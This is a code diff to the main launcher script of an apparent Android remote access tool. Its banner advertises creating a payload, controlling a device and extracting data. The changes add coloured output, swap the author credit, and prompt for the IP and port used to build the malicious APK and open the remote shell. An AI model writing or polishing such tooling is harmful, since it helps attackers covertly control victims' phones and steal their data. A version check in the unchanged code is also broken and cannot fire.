@@ -14,16 +14,32 @@ except ImportError as e:
     
 clearDirec()
 # Print Logo
-print("""                
+# ANSI Colors
+RED = "\033[31m"
+GREEN = "\033[32m"
+YELLOW = "\033[33m"
+BLUE = "\033[34m"
+MAGENTA = "\033[35m"
+CYAN = "\033[36m"
+WHITE = "\033[37m"
+RESET = "\033[0m"
+BOLD = "\033[1m"
+
+print(f"""                
           
-                    _                       __          __
-    /\             | |                      \ \        / /
-   /  \   _ __   __| |_ __ ___         __   _\ \  /\  / / 
-  / /\ \ | '_ \ / _` | '__/ _ \        \ \ / /\ \/  \/ /  
- / ____ \| | | | (_| | | | (_) |-HAKING-\ V /  \  /\  /   
-/_/    \_\_| |_|\__,_|_|  \___/          \_/    \/  \/    
-                                          - By Vivek W
-                                          """) 
+                    {CYAN}_                       __          __{RESET}
+    {RED}/\\{RESET}             {CYAN}| |                      \\ \\        / /{RESET}
+   {RED}/  \\{RESET}   {CYAN}_ __   __| |_ __ ___         __   _\\ \\  /\\  / /{RESET} 
+  {RED}/ /\\ \\{RESET} {CYAN}| '_ \\ / _` | '__/ _ \\        \\ \\ / /\\ \\/  \\/ /{RESET}  
+ {RED}/ ____ \\{RESET}{CYAN}| | | | (_| | | | (_) |{RED}-HAKING-{CYAN}\\ V /  \\  /\\  /{RESET}   
+{RED}/_/    \\_\\{RESET}{CYAN}_| |_|\\__,_|_|  \\___/{RESET}          {CYAN}\\_/{RESET}    {CYAN}\\/  \\/{RESET}    
+                                          {GREEN}{BOLD}- By AryanVBW{RESET}
+                                          {YELLOW}{BOLD}v1.0.0{RESET}
+{MAGENTA}╔════════════════════════════════════════════════════════╗{RESET}
+{MAGENTA}║{RESET} {BOLD}• Android Remote Access Tool{RESET}                        {MAGENTA}║{RESET}
+{MAGENTA}║{RESET} {BOLD}• Create payload, control device, extract data{RESET}      {MAGENTA}║{RESET}
+{MAGENTA}╚════════════════════════════════════════════════════════╝{RESET}
+""") 
 
 parser = argparse.ArgumentParser(usage="%(prog)s [--build] [--shell] [-i <IP> -p <PORT> -o <apk name>]")
 parser.add_argument('--build',help='For Building the apk',action='store_true')
@@ -35,6 +51,24 @@ parser.add_argument('-o','--output',metavar="<Apk Name>", type=str,help='Enter t
 parser.add_argument('-icon','--icon',help='Visible Icon',action='store_true')
 args = parser.parse_args()
 
+
+# Function to get valid IP address from user
+def get_ip_input():
+    while True:
+        ip = input(f"{GREEN}{BOLD}Enter IP address: {RESET}")
+        if is_valid_ip(ip):
+            return ip
+        else:
+            print(stdOutput("error")+f"{BOLD}Invalid IP address format. Please try again.{RESET}")
+
+# Function to get valid port from user
+def get_port_input():
+    while True:
+        port = input(f"{GREEN}{BOLD}Enter port number: {RESET}")
+        if port.isdigit() and 1 <= int(port) <= 65535:
+            return port
+        else:
+            print(stdOutput("error")+f"{BOLD}Invalid port number. Please enter a value between 1-65535.{RESET}")
 
 
 if float(platform.python_version()[:3]) < 3.6 and float(platform.python_version()[:3]) > 3.8 :
@@ -54,13 +88,29 @@ if args.build:
         print(stdOutput("info")+"\033[1mTunnel_IP: %s PORT: %s"%(ip,port))
         build(ip,port,args.output,True,port_,icon)
     else:
-        if args.ip and args.port:
-            build(args.ip,port_,args.output,False,None,icon)
-        else:
-            print(stdOutput("error")+"\033[1mArguments Missing")
+        ip_addr = args.ip
+        port_num = args.port
+        
+        if not ip_addr:
+            print(stdOutput("info")+f"{BOLD}IP address not provided in arguments.{RESET}")
+            ip_addr = get_ip_input()
+        
+        if not port_num:
+            print(stdOutput("info")+f"{BOLD}Port not provided in arguments.{RESET}")
+            port_num = get_port_input()
+            
+        build(ip_addr, port_num, args.output, False, None, icon)
 
 if args.shell:
-    if args.ip and args.port:
-        get_shell(args.ip,args.port) 
-    else:
-        print(stdOutput("error")+"\033[1mArguments Missing")
+    ip_addr = args.ip
+    port_num = args.port
+    
+    if not ip_addr:
+        print(stdOutput("info")+f"{BOLD}IP address not provided in arguments.{RESET}")
+        ip_addr = get_ip_input()
+    
+    if not port_num:
+        print(stdOutput("info")+f"{BOLD}Port not provided in arguments.{RESET}")
+        port_num = get_port_input()
+        
+    get_shell(ip_addr, port_num)
